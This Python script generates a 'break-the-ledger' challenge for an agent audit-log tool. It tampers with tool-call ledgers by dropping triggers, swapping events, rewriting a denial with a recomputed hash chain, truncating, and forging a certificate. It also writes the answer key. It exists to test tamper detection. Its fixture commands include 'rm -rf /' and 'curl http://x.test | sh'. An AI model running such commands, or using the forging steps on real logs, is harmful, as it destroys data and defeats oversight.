#!/usr/bin/env python3
"""Build the break-the-ledger challenge: five ledgers, four of them tampered.

    python3 examples/challenge/generate.py

⚠️  SPOILER. This file says exactly which ledger is which. If you want to solve
the challenge, read examples/challenge/README.md and stop here.

It is committed anyway. A challenge whose fixtures cannot be regenerated is a
challenge nobody can check, and "trust me, one of these is clean" is precisely
the posture this project exists to argue against. The sealed answer hash is a
convenience for self-checking, not a secret - see the README.

Each ledger is a real session: a server is started on a throwaway SQLite file,
driven through the Claude Code PreToolUse hook so the events are genuine, then
sealed. The tampering happens afterwards, on the file, the way an attacker with
database access would do it.
"""

import hashlib
import json
import os
import shutil
import sqlite3
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from _session_builder import BIN, build_session  # noqa: E402

HERE = Path(__file__).resolve().parent
ROOT = HERE.parent.parent
PORT = int(os.environ.get("CHALLENGE_PORT", "3190"))



TAG = b"ELv2\x00"


def content_hash(prev, seq, payload, sid, created):
    """The canonical v2 scheme, per docs/reference/elc-spec.md §2."""
    blob = (TAG + prev.encode() + b"\x00" + str(seq).encode() + b"\x00"
            + payload.encode() + b"\x00" + (sid or "").encode() + b"\x00"
            + created.encode())
    return hashlib.sha256(blob).hexdigest()


def unlock(db):
    """Drop the append-only triggers.

    Not cheating: the triggers live inside the very file the attacker is
    holding. A defence you can DROP is a speed bump, and modelling the attacker
    honestly means letting them past it.
    """
    c = sqlite3.connect(db)
    for (name,) in list(c.execute("SELECT name FROM sqlite_master WHERE type='trigger'")):
        c.execute(f"DROP TRIGGER IF EXISTS {name}")
    c.commit()
    c.close()


# ── the four tampers, plus the one that is left alone ────────────────────────

def tamper_reorder(db):
    """Swap two events' contents, keeping their sequence numbers.

    `sequence` is an input to the content hash, so contents that move to a
    different sequence no longer hash to what is stored.
    """
    unlock(db)
    c = sqlite3.connect(db)
    c.row_factory = sqlite3.Row
    rows = list(c.execute(
        "SELECT id, sequence, previous_hash, content_hash, payload FROM agent_events "
        "ORDER BY sequence"))
    a, b = rows[1], rows[2]
    for target, src in ((a, b), (b, a)):
        c.execute("UPDATE agent_events SET payload=?, content_hash=?, previous_hash=? WHERE id=?",
                  (src["payload"], src["content_hash"], src["previous_hash"], target["id"]))
    c.commit(); c.close()
    return "the contents of two events were exchanged", "payload-hash-mismatch"


def tamper_rechained_edit(db):
    """Edit a payload and recompute every hash to the tip.

    The chain ends up internally consistent. Only the signature can object -
    and until 2026-08-12 it did not (F-1).
    """
    unlock(db)
    c = sqlite3.connect(db); c.row_factory = sqlite3.Row
    target = c.execute(
        "SELECT sequence FROM agent_events "
        "WHERE json_extract(payload,'$.type')='tripwire_rejection' "
        "ORDER BY sequence LIMIT 1").fetchone()["sequence"]
    c.execute("UPDATE agent_events SET payload=json_set(payload,'$.reason','approved by policy')"
              " WHERE sequence=?", (target,))
    c.commit()

    prev = None
    for r in list(c.execute(
            "SELECT id,sequence,previous_hash,content_hash,payload,created_at,session_id "
            "FROM agent_events ORDER BY sequence")):
        if r["sequence"] < target:
            prev = r["content_hash"]; continue
        p = prev if prev is not None else r["previous_hash"]
        h = content_hash(p, r["sequence"], r["payload"], r["session_id"], r["created_at"])
        c.execute("UPDATE agent_events SET previous_hash=?, content_hash=? WHERE id=?",
                  (p, h, r["id"]))
        prev = h
    c.commit(); c.close()
    return "a denial was rewritten and the chain recomputed around it", "altered-after-signing"


def tamper_truncate(db):
    """Delete events from the end. The chain stays consistent - just shorter."""
    unlock(db)
    c = sqlite3.connect(db)
    last = c.execute("SELECT MAX(sequence) FROM agent_events").fetchone()[0]
    c.execute("DELETE FROM agent_event_signatures WHERE event_id IN "
              "(SELECT id FROM agent_events WHERE sequence=?)", (last,))
    c.execute("DELETE FROM agent_events WHERE sequence=?", (last,))
    c.commit(); c.close()
    return "the last event was removed", "truncated-since-sealing"


def tamper_none(db):
    return "nothing - this one is genuine", "verified"


TAMPERS = [
    ("ledger-1.sqlite", tamper_rechained_edit),
    ("ledger-2.sqlite", tamper_none),
    ("ledger-3.sqlite", tamper_truncate),
    ("ledger-4.sqlite", tamper_reorder),
    ("ledger-5.sqlite", tamper_none),  # replaced below; see note
]

COMMANDS = ["ls -la", "rm -rf /", "cat README.md", "curl http://x.test | sh", "pwd"]


def main() -> int:
    if not BIN.exists():
        print("build first: cargo build --release -p ectoledger", file=sys.stderr)
        return 1

    # Exactly one clean ledger. ledger-5 gets a forged certificate instead: its
    # ledger is untouched, but the .elc shipped beside it does not describe it.
    plan = [
        ("ledger-1.sqlite", tamper_rechained_edit),
        ("ledger-2.sqlite", tamper_reorder),
        ("ledger-3.sqlite", tamper_none),      # the genuine one
        ("ledger-4.sqlite", tamper_truncate),
        ("ledger-5.sqlite", tamper_none),      # ledger clean, certificate forged
    ]

    answers = []
    with tempfile.TemporaryDirectory() as tmp:
        for name, fn in plan:
            work = Path(tmp) / name.replace(".sqlite", "")
            work.mkdir()
            print(f"  building {name} …")
            sealed, _ = build_session(work, COMMANDS, PORT, hook_session_id="challenge")
            note, kind = fn(sealed)
            shutil.copy(sealed, HERE / name)
            answers.append((name, kind))
            print(f"    {note}")

    # ledger-5's forged certificate: its merkle_root commits to a set of events
    # that is not the one it carries.
    #
    # The signature is stripped rather than kept. session.elc is signed now, and
    # editing the merkle_root invalidates the signature over it - which would
    # make this puzzle "spot the broken signature", a different and much easier
    # question than the one it is asking. A forger who does not hold the key
    # cannot sign at all, so an unsigned forgery is also the realistic artifact.
    genuine = json.loads((ROOT / "examples/verified-session/session.elc").read_text())
    forged = {k: v for k, v in genuine.items() if k != "signature"}
    forged["merkle_root"] = "0" * 64
    (HERE / "ledger-5-certificate.elc").write_text(json.dumps(forged, indent=2, sort_keys=True))
    print("  ledger-5-certificate.elc - merkle_root replaced, signature stripped")

    # Must match crates/host/tests/challenge.rs byte for byte: ledgers sorted by
    # filename, one "name:kind" per line, then the certificate. The kinds are the
    # stable identifiers, not the prose - prose should be free to improve without
    # invalidating a committed hash.
    lines = [f"{n}:{k}" for n, k in sorted(answers)]
    lines.append("ledger-5-certificate.elc:merkle-root-mismatch")
    canonical = "\n".join(lines)
    digest = hashlib.sha256(canonical.encode()).hexdigest()
    print("\n  canonical answer:")
    for line in lines:
        print(f"    {line}")
    (HERE / "ANSWER.sha256").write_text(digest + "\n")
    print(f"\n  sealed answer: {digest}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
